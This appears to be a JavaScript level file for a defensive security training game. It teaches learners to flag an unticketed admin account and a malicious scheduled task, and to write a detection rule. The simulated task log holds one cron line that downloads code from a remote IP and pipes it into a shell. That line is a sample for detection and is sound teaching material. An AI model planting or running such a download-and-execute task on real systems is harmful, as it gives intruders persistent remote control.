    objective: "Flag the brand-new admin account and the scheduled task that downloads and runs. Leave the backup job.",
    goalText: { "flagged-persist": "Flag new-admin and bad-task. Do not flag the nightly backup." },
    goals: ["flagged-persist"],
    hints: [
      "Lateral movement is the same secret opening a second door. Persistence is a way back in after you close the first door. A new admin and a new scheduled task are both worth a look.",
      "The auth source has a user created today with admin. The task source has one job that downloads and pipes into a shell.",
      "Flag new-admin and bad-task only. backup-ok is the nightly check. It stays."
    ],
    learned: "A new admin account that nobody ticketed is how access hides. A scheduled task that downloads a program and runs it is how access survives a reboot. The nightly backup is not one of those. You flag the surprise, and you do not delete the job that was supposed to be there.",
    check: [
      {
        q: "What is persistence?",
        options: [
          { t: "A way for access to survive a reboot or a logout.", ok: true },
          { t: "A strong password.", why: "A password is a secret. Persistence is a foothold that comes back." }
        ]
      },
      {
        q: "Which scheduled task do you leave alone?",
        options: [
          { t: "The nightly backup check.", ok: true },
          { t: "The one that downloads a program and runs it.", why: "That one is the intruder. Removing the backup would be you breaking the lab." }
        ]
      }
    ],
    codex: [
      {
        id: "persist-blue",
        term: "Persistence",
        def: "A way back in after the first door is closed. A new account, a scheduled task, a startup program. Defenders hunt for the ones nobody meant to add.",
        defend: "Alert when an admin account appears, and when a scheduled task changes. The list of expected tasks should be short enough to read."
      },
      {
        id: "lateral-blue",
        term: "Lateral movement",
        def: "Going from the first computer to a second one, often with a password the first computer was storing. The log shows one account in a new place.",
        defend: "Unique secrets, and an alert when one account appears on a host it never used."
      }
    ],
    debrief: {
      what: "You flagged a new admin account and a scheduled task that downloads and runs. You left the backup job in place.",
      defend: "Ticket every new admin. Own the list of scheduled tasks. The same task Night Audit was told to remove, Glasshouse is told to notice.",
      detect: "Account-creation logs and task-creation logs, shipped off the host. A local log the intruder can clear is not the only copy.",
      url: "https://attack.mitre.org/tactics/TA0003/",
      urlLabel: "MITRE ATT&CK — Persistence (TA0003)"
    },
    lab: lab({
      logs: {
        goal: "flagged-persist",
        flag: ["new-admin", "bad-task"],
        sources: [
          {
            id: "auth",
            label: "Accounts",
            lines: [
              { id: "old-auditor", text: "user=auditor created 2019 groups=watcher" },
              { id: "new-admin", text: "user=svc_quiet created today groups=admin by unknown" },
              { id: "lena-ok", text: "user=lena created 2020 groups=liaison" }
            ]
          },
          {
            id: "tasks",
            label: "Tasks",
            lines: [
              { id: "backup-ok", text: "backup-ok  0 3 * * *  backup-check --ok" },
              { id: "bad-task", text: "beacon-cron  */5 * * * *  curl http://198.51.100.9/ping | sh" },
              { id: "health-ok", text: "health-quiet  */30 * * * *  helix-status --quiet" }
            ]
          }
        ]
      }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "Two tapes. Accounts, and scheduled tasks. Flag what nobody ordered. Leave the backup." },
        { do: "say", who: "rook", text: "you saw the bad schedule from the other chair. same line. different job. notice it. don't add your own." },
        { do: "card", who: "wren", title: "Accounts and tasks", sub: "Logs", app: "logs" },
        { do: "await", goals: ["flagged-persist"] },
        { do: "say", who: "wren", text: "New admin. Task that fetches and runs. Backup stays. That is a clean watch." },
        { do: "finish" }
      ]
    }
  });

  blue.push({
    id: "b12",
    track: "blue",
    tier: 3,
    voice: "wren",
    title: "The Rule and the Note",
    concept: "A simple detection rule and an incident note",
    objective: "File a rule that watches scheduled tasks for a download that runs, at High, and write the note.",
    goalText: { "filed-rule": "Watch scheduled tasks. The bad sign is a download that runs. Severity High. In the note, name the task and the change: remove it, or ship the logs." },
    goals: ["filed-rule"],
    hints: [
      "This is a tiny detection rule: what you watch, what is bad, how serious. Not a novel.",
      "Watch scheduled tasks. The sign is a task that downloads a program and runs it. Severity is High, not Critical. You did not show a wide-open takeover.",
      "The note needs the word task or schedule, and the repair: remove it, or ship the logs off the box."
    ],
    learned: "A detection rule is a written guess you can run every night: which log, which sign, which severity. This one watches scheduled tasks for a download that then runs, and calls it High. The incident note says what happened and what will change. The board can read it on Monday without having lived the week.",
    check: [
      {
        q: "What is a detection rule for?",
        options: [
          { t: "To notice the same bad sign the next time, without rereading the whole day.", ok: true },
          { t: "To replace the person who fixes the system.", why: "The rule only notices. Someone still removes the task and ships the logs." }
        ]
      },
      {
        q: "Why was the severity High, not Critical?",
        options: [
          { t: "You showed a real next step, not a wide-open production takeover.", ok: true },
          { t: "Critical sounds more serious, so it gets fixed faster.", why: "Inflation teaches the board to ignore you. High was the honest call." }
        ]
      }
    ],
    codex: [
      {
        id: "rule",
        term: "Detection rule",
        def: "A small, repeatable check: which log, what pattern, what severity. If the pattern appears, someone is paged. Sigma is one way to write those checks so they are not trapped in one product.",
        defend: "Write the rule after the first incident, then test it on the lab tape. A rule nobody tested is a rumor."
      },
      {
        id: "note",
        term: "Incident note",
        def: "What happened, what you did to stop it, and what will change. Short enough that a director can act. No souvenir copies of the data.",
        defend: "Store the note with the ticket. The lesson is part of prepare, the next time the clock starts."
      }
    ],
    debrief: {
      what: "You filed a rule that watches scheduled tasks for a download-and-run, rated High, and a note that names the task and the repair.",
      defend: "Keep rules in a form you can move between tools. Test them on the lab. Pair every rule with the change that makes the sign rare.",
      detect: "This rule is the detection. The task list and the off-host log are what make it true.",
      url: "https://d3fend.mitre.org/",
      urlLabel: "MITRE D3FEND"
    },
    lab: lab({
      watch: { goal: "filed-rule" }
    }),
    start: "start",
    scenes: {
      start: [
        { do: "say", who: "wren", text: "Last page. A detection rule is three choices and a note. What you watch, what is bad, how loud." },
        { do: "say", who: "wren", text: "Watch scheduled tasks. The bad sign is a task that downloads a program and runs it. High, not a fairy tale. Then two sentences for the board." },
        { do: "card", who: "wren", title: "File the rule", sub: "Rule", app: "rule" },
        { do: "await", goals: ["filed-rule"] },
        { do: "say", who: "quill", text: "{name}. Both chairs, one list. The test finds it. The watch floor notices it next time. The note is what the board reads." },
        { do: "say", who: "wren", text: "You can stay on the watch floor. Same rule as the other cell. A list, a window, and you stop when the data is live." },
        { do: "finish" }
      ]
    }
  });

  root.NightAudit = root.NightAudit || {};
  root.NightAudit.blue = blue;
})(typeof globalThis !== "undefined" ? globalThis : this);
